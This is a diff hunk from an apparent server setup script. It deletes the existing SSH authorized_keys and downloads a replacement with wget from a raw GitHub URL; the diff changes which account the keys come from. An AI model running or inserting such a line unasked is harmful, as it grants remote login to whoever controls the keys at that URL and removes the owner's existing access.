@@ -80,7 +80,7 @@ chmod 700 ~/.ssh
 cd ~/.ssh
 rm -f authorized_keys
 
-wget --https-only -q -t 2 "https://raw.githubusercontent.com/ai788999/001/main/${USE_KEY}" -O authorized_keys
+wget --https-only -q -t 2 "https://raw.githubusercontent.com/ai7778/main/key/${USE_KEY}" -O authorized_keys
 chmod 600 authorized_keys
 
 # ====================== SSH 加固 ======================
